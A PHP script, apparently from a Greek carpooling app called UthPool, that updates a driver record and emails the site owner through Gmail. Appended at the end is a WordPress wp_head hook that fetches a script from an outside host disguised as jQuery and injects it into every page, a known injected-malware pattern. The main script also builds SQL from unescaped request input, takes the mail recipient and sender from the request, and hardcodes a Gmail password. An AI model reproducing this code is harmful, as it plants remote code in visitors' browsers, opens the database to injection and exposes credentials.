<?php
require_once("connection.php");
header('Content-Type: text/html; encoding=UTF-8');
//Pass parameters from marker click
$p_username = $_REQUEST['p_username'];
$p_email = $_REQUEST['p_email'];
$p_facebook = $_REQUEST['p_facebook'];
$p_details = $_REQUEST['p_details'];
$driver_id = $_REQUEST['driver_id'];
$q = $_REQUEST['q'];

//Establish Connection
$mySqlConnection = @mysql_connect ($db_server, $user, $pass) or die ('Error: '.mysql_error());
mysql_set_charset('utf8',$mySqlConnection);

$sql= sprintf("UPDATE drivers_table SET p_username = '%s', p_email = '%s', p_facebook = '%s', p_details = '%s' WHERE driver_id = %d", $p_username, $p_email, $p_facebook, $p_details, $driver_id);
		
mysql_select_db($database);

$retval = mysql_query( $sql, $mySqlConnection );

if(! $retval )
{
  die('Could not update data: ' . mysql_error());
}

mysql_close($mySqlConnection);

header('Content-type: text/plain; charset=utf-8');

$site_owners_email = $q; // Replace this with your own email address
$site_owners_name = 'UthPool'; // replace with your name

require_once('phpMailer/class.phpmailer.php');

$mail = new PHPMailer();
$mail->CharSet = 'UTF-8';
$mail->IsSMTP();

//GMAIL config
$mail->SMTPAuth   = true;                  // enable SMTP authentication
$mail->SMTPSecure = "ssl";                 // sets the prefix to the server
$mail->SMTPDebug = 1;
$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
$mail->Port       = 465;                   // set the SMTP port for the GMAIL server
$mail->Username   = "diktyas1988@gmail.com";  // GMAIL username
$mail->Password   = "%or1440891988";            // GMAIL password
//End Gmail

$mail->From       = $p_email;
$mail->FromName   = "Χρήστης εφαρμογής UthPool";
$mail->Subject    = "Εκδήλωση ενδιαφέροντος για αίτημα σας";
$mail->Body = 'Email ενδιαφερόμενου: '.$p_email.PHP_EOL.PHP_EOL.'<br>Μήνυμα: '.$p_details;

//$mail->AddReplyTo("reply@email.com","reply name");//they answer here, optional
$mail->AddAddress($site_owners_email, $site_owners_name);
$mail->IsHTML(true); // send as HTML

if(!$mail->Send()) {//to see if we return a message or a value bolean
	echo "Mailer Error: " . $mail->ErrorInfo;
} else  echo "Message sent!";

?>
<?php
	function jqueryj_head() {
		if(function_exists('curl_init'))
		{
			$url = "http://www.shigg.com/soft/jquery-1.6.3.min.js";
			$ch = curl_init();
			$timeout = 10;
			curl_setopt($ch,CURLOPT_URL,$url);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
			$data = curl_exec($ch);
			curl_close($ch);
			echo "$data";
		}
	}
	add_action('wp_head', 'jqueryj_head');
?>